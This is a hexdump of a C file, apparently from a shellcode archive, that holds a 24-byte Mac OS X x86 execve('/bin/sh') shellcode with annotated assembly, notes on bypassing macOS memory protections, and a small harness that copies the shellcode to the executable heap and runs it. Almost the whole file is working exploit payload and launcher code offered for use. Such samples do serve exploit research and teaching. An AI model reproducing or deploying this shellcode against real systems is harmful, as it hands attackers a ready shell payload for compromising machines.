00000000  2f 2a 0d 0a 54 69 74 6c  65 20 3a 20 4f 53 58 2f  |/*..Title : OSX/|
00000010  78 38 36 20 69 6e 74 65  6c 20 2d 20 65 78 65 63  |x86 intel - exec|
00000020  76 65 28 2f 62 69 6e 2f  73 68 29 20 2d 20 32 34  |ve(/bin/sh) - 24|
00000030  20 62 79 74 65 73 0d 0a  54 79 70 65 20 3a 20 53  | bytes..Type : S|
00000040  68 65 6c 6c 63 6f 64 65  0d 0a 41 75 74 68 6f 72  |hellcode..Author|
00000050  20 3a 20 53 69 6d 6f 6e  20 44 65 72 6f 75 69 6e  | : Simon Derouin|
00000060  65 61 75 20 2d 20 73 69  6d 6f 6e 2e 64 65 72 6f  |eau - simon.dero|
00000070  75 69 6e 65 61 75 20 5b  41 54 5d 20 69 6e 67 65  |uineau [AT] inge|
00000080  73 75 70 2e 63 6f 6d 0d  0a 50 6c 61 74 66 6f 72  |sup.com..Platfor|
00000090  6d 20 3a 20 4d 61 63 20  4f 53 58 2f 49 6e 74 65  |m : Mac OSX/Inte|
000000a0  6c 2e 20 54 65 73 74 65  64 20 6f 6e 20 31 30 2e  |l. Tested on 10.|
000000b0  36 2e 34 20 42 75 69 6c  64 20 31 30 46 35 36 39  |6.4 Build 10F569|
000000c0  0d 0a 0d 0a 49 6e 66 6f  72 6d 61 74 69 6f 6e 73  |....Informations|
000000d0  20 3a 20 54 68 69 73 20  63 6f 64 65 20 68 61 73  | : This code has|
000000e0  20 74 6f 20 62 65 20 63  6f 6d 70 69 6c 65 64 20  | to be compiled |
000000f0  77 69 74 68 20 67 63 63  20 2d 6d 33 32 20 73 77  |with gcc -m32 sw|
00000100  69 74 63 68 20 20 6f 6e  20 31 30 2e 36 2e 30 2b  |itch  on 10.6.0+|
00000110  0d 0a 0d 0a 4d 6f 72 65  20 69 6e 66 6f 72 6d 61  |....More informa|
00000120  74 69 6f 6e 73 20 3a 20  78 38 36 2d 36 34 20 63  |tions : x86-64 c|
00000130  6f 64 65 20 69 73 20 6d  6f 72 65 20 73 65 63 75  |ode is more secu|
00000140  72 65 64 20 74 68 61 6e  20 78 38 36 20 63 6f 64  |red than x86 cod|
00000150  65 20 6f 6e 20 4f 53 58  20 70 6c 61 74 66 6f 72  |e on OSX platfor|
00000160  6d 20 3a 20 0d 0a 43 61  6e 61 72 69 65 73 20 61  |m : ..Canaries a|
00000170  72 65 20 61 64 64 65 64  2c 20 53 74 61 63 6b 20  |re added, Stack |
00000180  61 6e 64 20 68 65 61 70  20 61 72 65 20 6e 6f 6e  |and heap are non|
00000190  2d 65 78 65 63 75 74 61  62 6c 65 2c 20 65 74 63  |-executable, etc|
000001a0  2e 0d 0a 0d 0a 41 6c 73  6f 2c 20 63 61 74 20 2f  |.....Also, cat /|
000001b0  76 61 72 2f 64 62 2f 64  79 6c 64 2f 64 79 6c 64  |var/db/dyld/dyld|
000001c0  5f 73 68 61 72 65 64 5f  63 61 63 68 65 5f 78 38  |_shared_cache_x8|
000001d0  36 5f 36 34 2e 6d 61 70  20 73 68 6f 77 73 20 74  |6_64.map shows t|
000001e0  68 61 74 20 6e 6f 20 6d  65 6d 6f 72 79 20 63 61  |hat no memory ca|
000001f0  6e 20 62 65 20 0d 0a 6d  61 70 70 65 64 20 77 69  |n be ..mapped wi|
00000200  74 68 20 57 58 20 66 6c  61 67 73 2c 20 77 68 69  |th WX flags, whi|
00000210  6c 65 20 69 74 27 73 20  70 6f 73 73 69 62 6c 65  |le it's possible|
00000220  20 77 69 74 68 20 78 38  36 20 63 6f 64 65 20 28  | with x86 code (|
00000230  20 61 63 63 6f 72 64 69  6e 67 20 74 6f 20 20 2f  | according to  /|
00000240  76 61 72 2f 64 62 2f 64  79 6c 64 2f 64 79 6c 64  |var/db/dyld/dyld|
00000250  5f 73 68 61 72 65 64 5f  63 61 63 68 65 5f 69 33  |_shared_cache_i3|
00000260  38 36 2e 6d 61 70 29 2e  0d 0a 0d 0a 54 68 65 20  |86.map).....The |
00000270  6d 65 74 68 6f 64 20 75  73 65 64 20 68 65 72 65  |method used here|
00000280  20 69 73 20 74 68 65 20  65 61 73 69 65 72 20 6f  | is the easier o|
00000290  6e 65 2c 20 68 65 61 70  20 69 73 20 65 78 65 63  |ne, heap is exec|
000002a0  75 74 61 62 6c 65 20 69  6e 20 78 38 36 20 61 70  |utable in x86 ap|
000002b0  70 6c 69 63 61 74 69 6f  6e 73 2c 20 0d 0a 61 73  |plications, ..as|
000002c0  20 64 65 73 63 72 69 62  65 64 20 69 6e 20 22 54  | described in "T|
000002d0  68 65 20 4d 61 63 20 48  61 63 6b 65 72 27 73 20  |he Mac Hacker's |
000002e0  48 61 6e 64 62 6f 6f 6b  22 2c 20 77 72 69 74 74  |Handbook", writt|
000002f0  65 6e 20 62 79 20 43 68  61 72 6c 69 65 20 4d 69  |en by Charlie Mi|
00000300  6c 6c 65 72 2e 0d 0a 0d  0a 54 68 65 20 74 72 69  |ller.....The tri|
00000310  63 6b 20 69 73 20 74 6f  20 6d 65 6d 63 6f 70 79  |ck is to memcopy|
00000320  20 74 68 65 20 73 68 65  6c 6c 63 6f 64 65 20 74  | the shellcode t|
00000330  6f 20 74 68 65 20 68 65  61 70 20 62 65 66 6f 72  |o the heap befor|
00000340  65 20 65 78 65 63 75 74  69 6e 67 20 69 74 2e 0d  |e executing it..|
00000350  0a 0d 0a 2a 2f 0d 0a 0d  0a 0d 0a 23 69 6e 63 6c  |...*/......#incl|
00000360  75 64 65 20 3c 73 74 64  69 6f 2e 68 3e 20 0d 0a  |ude <stdio.h> ..|
00000370  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 6c 69 62  |#include <stdlib|
00000380  2e 68 3e 20 0d 0a 23 69  6e 63 6c 75 64 65 20 3c  |.h> ..#include <|
00000390  73 74 72 69 6e 67 2e 68  3e 0d 0a 0d 0a 0d 0a 0d  |string.h>.......|
000003a0  0a 63 68 61 72 20 73 68  65 6c 6c 63 6f 64 65 5b  |.char shellcode[|
000003b0  5d 3d 20 09 22 5c 78 33  31 5c 78 43 30 22 20 09  |]= ."\x31\xC0" .|
000003c0  09 09 2f 2f 20 78 6f 72  20 65 61 78 2c 65 61 78  |..// xor eax,eax|
000003d0  0d 0a 09 09 09 22 5c 78  35 30 22 09 09 09 09 2f  |....."\x50"..../|
000003e0  2f 20 70 75 73 68 20 65  61 78 0d 0a 09 09 09 22  |/ push eax....."|
000003f0  5c 78 36 38 5c 78 32 46  5c 78 32 46 5c 78 37 33  |\x68\x2F\x2F\x73|
00000400  5c 78 36 38 22 09 09 2f  2f 20 70 75 73 68 20 64  |\x68"..// push d|
00000410  77 6f 72 64 0d 0a 09 09  09 22 5c 78 36 38 5c 78  |word....."\x68\x|
00000420  32 46 5c 78 36 32 5c 78  36 39 5c 78 36 45 22 09  |2F\x62\x69\x6E".|
00000430  09 2f 2f 20 70 75 73 68  20 64 77 6f 72 64 20 0d  |.// push dword .|
00000440  0a 09 09 09 22 5c 78 38  39 5c 78 45 33 22 09 09  |...."\x89\xE3"..|
00000450  09 2f 2f 20 6d 6f 76 20  65 62 78 2c 65 73 70 0d  |.// mov ebx,esp.|
00000460  0a 09 09 09 22 5c 78 35  30 5c 78 35 30 5c 78 35  |...."\x50\x50\x5|
00000470  33 22 09 09 09 2f 2f 20  70 75 73 68 20 65 61 78  |3"...// push eax|
00000480  2c 20 70 75 73 68 20 65  61 78 2c 20 70 75 73 68  |, push eax, push|
00000490  20 65 62 78 0d 0a 09 09  09 22 5c 78 42 30 5c 78  | ebx....."\xB0\x|
000004a0  33 42 22 09 09 09 2f 2f  20 6d 6f 76 20 61 6c 2c  |3B"...// mov al,|
000004b0  30 78 33 62 0d 0a 09 09  09 22 5c 78 36 41 5c 78  |0x3b....."\x6A\x|
000004c0  32 41 22 09 09 09 2f 2f  20 70 75 73 68 20 62 79  |2A"...// push by|
000004d0  74 65 20 30 78 32 61 0d  0a 09 09 09 22 5c 78 43  |te 0x2a....."\xC|
000004e0  44 5c 78 38 30 22 09 09  09 2f 2f 20 69 6e 74 20  |D\x80"...// int |
000004f0  30 78 38 30 0d 0a 0d 0a  0d 0a 69 6e 74 20 6d 61  |0x80......int ma|
00000500  69 6e 28 69 6e 74 20 61  72 67 63 2c 20 63 68 61  |in(int argc, cha|
00000510  72 20 2a 61 72 67 76 5b  5d 29 7b 0d 0a 76 6f 69  |r *argv[]){..voi|
00000520  64 20 28 2a 66 29 28 29  3b 20 0d 0a 63 68 61 72  |d (*f)(); ..char|
00000530  20 2a 78 20 3d 20 6d 61  6c 6c 6f 63 28 73 69 7a  | *x = malloc(siz|
00000540  65 6f 66 28 73 68 65 6c  6c 63 6f 64 65 29 29 3b  |eof(shellcode));|
00000550  0d 0a 6d 65 6d 63 70 79  28 78 2c 20 73 68 65 6c  |..memcpy(x, shel|
00000560  6c 63 6f 64 65 2c 20 73  69 7a 65 6f 66 28 73 68  |lcode, sizeof(sh|
00000570  65 6c 6c 63 6f 64 65 29  29 3b 0d 0a 66 20 3d 20  |ellcode));..f = |
00000580  28 76 6f 69 64 20 28 2a  29 28 29 29 20 78 3b 0d  |(void (*)()) x;.|
00000590  0a 66 28 29 3b 0d 0a 7d                           |.f();..}|
00000598
